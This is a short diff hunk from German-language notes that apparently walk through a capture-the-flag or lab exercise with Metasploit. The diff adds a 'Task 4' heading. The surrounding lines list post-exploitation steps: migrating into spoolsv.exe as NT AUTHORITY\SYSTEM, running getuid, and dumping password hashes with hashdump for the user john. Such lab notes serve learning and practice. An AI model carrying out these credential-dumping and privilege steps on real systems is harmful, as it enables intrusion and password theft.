@@ -65,6 +65,10 @@ set LPORT 4445
 => spoolsv.exe, hängt sich an diesen Prozessor, x64, NT AUTHORITY\SYSTEM
 13. migrate (Prozessid)
 14. getuid
+
+```
+## Task 4
+```
 15. hashdump
 => copy key vom john
 16. echo "john"
